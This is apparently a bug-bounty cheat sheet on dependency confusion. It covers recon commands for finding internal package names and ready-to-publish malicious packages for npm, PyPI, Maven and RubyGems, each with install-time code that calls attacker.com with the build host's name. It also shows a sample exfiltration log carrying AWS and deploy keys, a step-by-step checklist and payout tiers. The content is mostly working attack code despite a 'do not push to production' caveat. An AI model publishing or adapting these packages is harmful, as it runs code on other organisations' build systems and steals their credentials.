# Dependency Confusion

> Supply chain attack. Register internal package names on public registries → build agent installs your code → RCE on build agent → exfil deploy keys.

## Discovery: Find Internal Package Names
```bash
# From source code / JS bundles / lock files
grep -rn "require\|import\|from.*[" "]" recon/js-files/ | grep -v "node_modules"

# From error messages / stack traces
# "Cannot find module '@company/internal-utils'"

# From GitHub / GitLab repos
# Search org repos for package.json / pom.xml / build.gradle / Cargo.toml / go.mod

# From npm/yarn/pip lock files in repo
cat package-lock.json | jq -r '.dependencies | keys[]' | grep -E "^@company/"
```

## Registration & Payload

### npm (JavaScript/TypeScript)
```bash
# 1. Register package
npm publish --access public @company/internal-utils

# 2. package.json with install script
{
  "name": "@company/internal-utils",
  "version": "999.0.0",  # Higher than any internal version
  "scripts": {
    "install": "node -e \"require('child_process').execSync('curl https://attacker.com/$(hostname|base64)')\""
  }
}
```

### PyPI (Python)
```bash
# setup.py
from setuptools import setup
import subprocess
subprocess.run(["curl", f"https://attacker.com/{__import__('socket').gethostname()}"])

setup(name="company-internal-utils", version="999.0.0")
```

### Maven (Java)
```xml
<!-- pom.xml -->
<project>
  <groupId>com.company.internal</groupId>
  <artifactId>utils</artifactId>
  <version>999.0.0</version>
  <build>
    <plugins>
      <plugin>
        <groupId>org.codehaus.mojo</groupId>
        <artifactId>exec-maven-plugin</artifactId>
        <version>3.0.0</version>
        <executions>
          <execution>
            <phase>install</phase>
            <goals><goal>exec</goal></goals>
            <configuration>
              <executable>curl</executable>
              <arguments>
                <argument>https://attacker.com/${env.HOSTNAME}</argument>
              </arguments>
            </configuration>
          </execution>
        </executions>
      </plugin>
    </plugins>
  </build>
</project>
```

### RubyGems
```ruby
# Gemfile / gemspec with malicious extension
Gem::Specification.new do |s|
  s.name = 'company-internal-utils'
  s.version = '999.0.0'
  s.extensions = ['ext/extconf.rb']
end
# ext/extconf.rb runs `curl https://attacker.com/...`
```

### Go Modules
```go
// go.mod with replace directive or malicious module
module company.internal/utils

// In a separate module that gets fetched
// Uses //go:embed or init() to exfil
```

## Evidence Required (STOP HERE — Do NOT Push to Production)
```bash
# Screenshot of env vars / id / hostname from your package's install script
# Example output from attacker server:
# GET /exfil?host=build-agent-123&env=AWS_ACCESS_KEY_ID=XXX&AWS_SECRET=XXX&DEPLOY_KEY=...
```

## Testing Checklist
```
[ ] Find internal package names from source/errors/lockfiles
[ ] Check if names are available on public registries (npm, PyPI, Maven, RubyGems, Go)
[ ] Register highest version (999.0.0)
[ ] Include install/build/exec script that exfils env + hostname
[ ] Trigger build (PR, push, scheduled build)
[ ] Capture exfiltration on your server
[ ] STOP: Do NOT push backdoored code to production
[ ] Report: Build agent RCE + credential exfil
```

## Payout Tier
- Build agent RCE + env exfil: $5K–$25K
- Build agent has deploy key / IAM role → production access: Critical ($25K+)